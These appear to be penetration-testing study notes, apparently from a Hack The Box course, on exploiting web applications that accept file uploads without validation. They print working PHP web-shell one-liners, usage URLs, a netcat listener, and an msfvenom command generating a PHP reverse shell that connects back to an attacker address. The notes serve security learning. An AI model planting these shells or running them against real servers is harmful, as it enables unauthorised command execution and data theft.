# File Upload Attacks - Basic Exploitation

## 🚨 Absent Validation
This is the most critical and easiest file upload vulnerability to exploit.
If there is no validation → any file can be uploaded → full server compromise.

---

## 🔓 What Does It Mean?
The application does not validate:
- File extension  
- File content  
- MIME type  
- Any upload restrictions  

➡️ Result: Arbitrary File Upload

---

## ⚙️ Attack Flow

### 1. Upload a Malicious File
Example:
<?php echo "Hello HTB"; ?>

Or a web shell:
<?php system($_GET['cmd']); ?>

### 2. File is Stored Without Restrictions
Example path: `/uploads/shell.php`

### 3. Access the File
URL: `http://SERVER/uploads/shell.php`

### 4. Code Execution
If you see: "Hello HTB" ➡️ Code execution confirmed (RCE)

---

## 🧠 Identify Backend Technology
Before uploading payloads, identify the backend language.

Methods:
- Try extensions: `/index.php`, `/index.asp`, `/index.aspx`
- Use tools like Wappalyzer
- Analyze: HTTP headers, Cookies, URL structure

---

## ⚠️ Indicators of Vulnerability
- “All Files” allowed in the file picker.
- .php (or other script) upload works without errors.
- No validation errors or warnings.
- File executes immediately after upload.
➡️ Likely no validation at all.

---

## 💥 Impact
- Remote command execution (RCE).
- Full system access.
- Data exfiltration.
- Lateral movement within the network.

---

## 🚀 Upload Exploitation
Once upload is possible, the goal is to gain control of the system.

### 🐚 Web Shell
A web shell allows command execution via browser.

Simple Web Shell:
<?php system($_REQUEST['cmd']); ?>

Usage:
`http://SERVER/uploads/shell.php?cmd=id`

Example output:
`uid=33(www-data)`

Using Existing Shells:
- phpbash
- SecLists Web-Shells

### 🔄 Reverse Shell
More powerful than a web shell.
✔ Interactive access  
✔ Better for post-exploitation  
✔ Enables pivoting  

1. Prepare Payload: Set `$ip` to YOUR_IP and `$port` to YOUR_PORT.
2. Start Listener: `nc -lvnp 4444`
3. Execute Payload: Visit `http://SERVER/uploads/reverse.php`
Result: `connect to YOUR_IP` ➡️ Shell access obtained.

### ⚙️ Generate Reverse Shell (msfvenom)
msfvenom -p php/reverse_php LHOST=YOUR_IP LPORT=4444 -f raw > reverse.php

---

## 🧠 Web Shell vs Reverse Shell
- Web Shell: Simple, reliable | Cons: Limited functionality.
- Reverse Shell: Interactive, powerful | Cons: May be blocked by firewalls.

---

## ⚠️ Common Issues
- system() function disabled in php.ini.
- Firewall blocking outbound traffic.
- WAF (Web Application Firewall) detection.
- Permission restrictions on the upload folder.

---

## 🔥 Summary
1. Upload without validation.
2. Upload web shell.
3. Execute commands.
4. If possible → Upgrade to reverse shell → Full system control.

---

## 🧠 Pentester Mindset
- Can I execute code?
- Can I get a shell?
- Can I escalate privileges?
